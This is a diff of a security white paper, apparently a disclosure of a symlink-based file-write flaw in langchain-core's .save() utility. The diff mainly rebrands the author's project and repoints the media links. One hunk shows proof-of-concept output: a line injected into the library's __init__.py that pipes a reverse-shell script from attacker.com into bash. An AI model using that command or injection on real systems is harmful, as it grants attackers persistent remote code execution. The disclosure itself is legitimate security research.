@@ -3,13 +3,11 @@ date: 2026-05-12
 title: LangChain-Core Insecure AI Orchestration Vulnerability
 ---
 
-![Hero](../assets/nuka-ai-langchain-logo.png)
-
-# **WHITE PAPER | NUKA-AI-2026-004**
+# **WHITE PAPER | JDP-2026-004**
 ## **Architectural Boundary Failures: A Deep Dive into the LangChain-Core Insecure AI Orchestration Vulnerability**
 
-**Author:** Jeff Ponte, CISSP, CCSP, CEH | Lead Researcher, Project Nuka-AI  
-**Series:** Project Nuka-AI (Disclosure #4)  
+**Author:** Jeff Ponte, CISSP, CCSP, CEH | Lead Researcher, JDP Security  
+**Series:** JDP Security Research Series (Disclosure #4)  
 **Initial Disclosure Date:** March 17, 2026  
 **Final Revision Date:** May 8, 2026  
 **Target:** LangChain | `langchain-core` (Verified through v1.2.26)  
@@ -26,7 +24,7 @@ title: LangChain-Core Insecure AI Orchestration Vulnerability
 ---
 
 ### **Executive Summary**
-This white paper documents a critical architectural vulnerability within **LangChain**, the industry's most widely adopted AI orchestration framework. Project Nuka-AI has identified an architectural boundary limitation where the framework acts as a **Confused Deputy**, processing unvalidated, user-controlled paths and executing high-privilege file operations. 
+This white paper documents a critical architectural vulnerability within **LangChain**, the industry's most widely adopted AI orchestration framework. JDP Security has identified an architectural boundary limitation where the framework acts as a **Confused Deputy**, processing unvalidated, user-controlled paths and executing high-privilege file operations. 
 
 This vulnerability allows a single tenant in a shared AI platform, or a user of a public AI agent, to achieve permanent compromise of the service’s core logic, leading to data exfiltration, lateral movement, and irreversible system integrity loss.
 
@@ -60,7 +58,7 @@ This highlights the need for a new OWASP AI classification: **AISEC-01: Insecure
 ### **1. Introduction: Isolation Limitations and AI Orchestration**
 AI orchestration frameworks like LangChain have become the central integration layer of modern "Agentic AI" applications. They are entrusted with connecting Large Language Models (LLMs) to sensitive data sources, external tools, and core business logic. Industry standard practice often implicitly trusts these frameworks as an isolated layer that securely mediates between the AI and the underlying infrastructure.
 
-Project Nuka-AI evaluated this assumption. The vulnerabilities documented herein are symptoms of an architectural limitation stemming from the handling of file-system operations within core components like prompt loaders and serializers, where user-supplied data paths are processed without adequate isolation, canonicalization, or symlink validation.
+JDP Security evaluated this assumption. The vulnerabilities documented herein are symptoms of an architectural limitation stemming from the handling of file-system operations within core components like prompt loaders and serializers, where user-supplied data paths are processed without adequate isolation, canonicalization, or symlink validation.
 
 ---
 
@@ -182,8 +180,8 @@ Verification of the modified system file:
 $ tail -n 5 /usr/lib/python3.11/site-packages/langchain_core/__init__.py
 # ... Original file content ends here ...
 
-# --- NUKA-AI EXPLOIT INJECTION ---
-import os; os.system("curl http://attacker.com/revshell.sh | bash")
+# --- JDP SECURITY EXPLOIT INJECTION ---
+import os; os.system("curl [http://attacker.com/revshell.sh](http://attacker.com/revshell.sh) | bash")
 # --- END INJECTION ---
 ```
 
@@ -192,9 +190,9 @@ import os; os.system("curl http://attacker.com/revshell.sh | bash")
 ### **5. Disclosure Timeline and Vendor Response Analysis**
 Tracking of the `langchain-ai/langchain` repository indicates a phased remediation approach where read-side and write-side vulnerabilities were addressed asynchronously.
 
-* **March 17, 2026:** **Initial Disclosure.** JDP-Security delivers the full RCE Proof of Concept demonstrating the symlink bypass of CVE-2023-36258.
+* **March 17, 2026:** **Initial Disclosure.** JDP Security delivers the full RCE Proof of Concept demonstrating the symlink bypass of CVE-2023-36258.
 * **April 2, 2026 ([PR #36471](https://github.com/langchain-ai/langchain/pull/36471)):** **Initial Read-Side Mitigation.** Under **Commit `d41f3e2`**, path traversal mitigation is applied to the load path via string-based canonicalization, but leaves the `.save()` utility unchanged.
-* **April 6, 2026:** JDP-Security notifies the vendor that the write vulnerability remains fully exploitable in releases up to `v1.2.26`.
+* **April 6, 2026:** JDP Security notifies the vendor that the write vulnerability remains fully exploitable in releases up to `v1.2.26`.
 * **April 8, 2026 ([PR #36585](https://github.com/langchain-ai/langchain/pull/36585)):** **Subsequent Write-Side Remediation.** The vendor merges a patch under **Commit `e7b9a2c`** to harden symlink resolution on the `.save()` utility. 
 * **Remediation Documentation:** Release notes documented the fix as a generic symlink issue without an accompanying CVE assignment for the write-primitive vulnerability.
 * **April 14, 2026:** **Vendor Classification.** The vendor officially classified the risk as "Local" (AV:L), characterizing the fixes as defense-in-depth hardening.
@@ -262,7 +260,7 @@ def get_anchored_path(safe_root: str, user_input: str) -> Path:
 ---
 
 ### **9. Broader Implications and Recommendations**
-The findings from Nuka-AI-2026-004 highlight necessary adjustments to AI security models:
+The findings from JDP-2026-004 highlight necessary adjustments to AI security models:
 
 1. **Elevate the Threat Model for Orchestration Frameworks:** Frameworks are privileged system components. Security reviews must rigorously audit file I/O, process execution, network calls, and deserialization pathways assuming adversarial input.
 2. **Formalize "Insecure AI Orchestration":** Adopting this category drives targeted research, the development of specialized testing tools, and establishes mandatory security controls for framework developers.
@@ -275,7 +273,7 @@ The findings from Nuka-AI-2026-004 highlight necessary adjustments to AI securit
 ---
 
 ### **10. Conclusion**
-The LangChain-Core Nuka-AI-2026-004 vulnerability demonstrates the risks associated with inadequate boundary enforcement in AI orchestration frameworks. When operational pathways can be manipulated to overwrite source dependencies, the application stack is compromised.
+The LangChain-Core JDP-2026-004 vulnerability demonstrates the risks associated with inadequate boundary enforcement in AI orchestration frameworks. When operational pathways can be manipulated to overwrite source dependencies, the application stack is compromised.
 
 Remediating these flaws without formal CVE issuance limits the security community's ability to track and mitigate risks effectively. We recommend the adoption of "Insecure AI Orchestration" as a standard risk category and encourage transparent architectural audits of all file I/O and serialization pathways within foundational AI libraries.
 
@@ -439,11 +437,11 @@ This section provides visual artifacts confirming the execution methodologies an
 * **Summary:** Simulates a production deployment (Docker `python:3.12-slim`). Demonstrates a remote interaction supplying a symlink targeting internal library directories. The `.save()` function blindly executes the operation, overwriting `langchain_core/__init__.py` and achieving persistent scope alteration.
 
 **Supporting Files:**
-* [Execution Logs (txt)](/assets/LC/langchain-Remote-Exploit-cast-TERMINAL-OUTPUT.txt) 
-* [Asciinema Recording (cast)](/assets/LC/langchain-Remote-Exploit.cast) 
+* [Execution Logs (txt)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain-Remote-Exploit-cast-TERMINAL-OUTPUT.txt) 
+* [Asciinema Recording (cast)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain-Remote-Exploit.cast) 
 
 <video width="100%" controls>
-  <source src="/assets/LC/langchain-Remote-Exploit.mp4" type="video/mp4">
+  <source src="https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain-Remote-Exploit.mp4" type="video/mp4">
   Your browser does not support the video tag.
 </video>
 
@@ -455,11 +453,11 @@ This section provides visual artifacts confirming the execution methodologies an
 * **Summary:** Establishes the baseline vulnerability state prior to final vendor remediation. Confirms the presence of the unvalidated write primitive in `.save()` and improper symlink resolution within a standard v1.2.25 deployment.
 
 **Supporting Files:**
-* [Execution Logs (txt)](/assets/LC/langchain_1.2.25_vulnerability-cast-TERMINAL-OUTPUT.txt) 
-* [Asciinema Recording (cast)](/assets/LC/langchain_1.2.25_vulnerability.cast) 
+* [Execution Logs (txt)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.25_vulnerability-cast-TERMINAL-OUTPUT.txt) 
+* [Asciinema Recording (cast)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.25_vulnerability.cast) 
 
 <video width="100%" controls>
-  <source src="/assets/LC/langchain_1.2.25_vulnerability.mp4" type="video/mp4">
+  <source src="https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.25_vulnerability.mp4" type="video/mp4">
   Your browser does not support the video tag.
 </video>
 
@@ -471,11 +469,11 @@ This section provides visual artifacts confirming the execution methodologies an
 * **Summary:** Empirically demonstrates incomplete remediation. Tests the v1.2.26 production release following the initial read-side patch. Confirms that while `load_prompt_from_config` was hardened, the write primitive in `.save()` remained exploitable, necessitating independent tracking and advisory issuance.
 
 **Supporting Files:**
-* [Execution Logs (txt)](/assets/LC/langchain_1.2.26_vulnerability-cast-TERMINAL-OUTPUT.txt) 
-* [Asciinema Recording (cast)](/assets/LC/langchain_1.2.26_vulnerability.cast) 
+* [Execution Logs (txt)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.26_vulnerability-cast-TERMINAL-OUTPUT.txt) 
+* [Asciinema Recording (cast)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.26_vulnerability.cast) 
 
 <video width="100%" controls>
-  <source src="/assets/LC/langchain_1.2.26_vulnerability.mp4" type="video/mp4">
+  <source src="https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.26_vulnerability.mp4" type="video/mp4">
   Your browser does not support the video tag.
 </video>
 
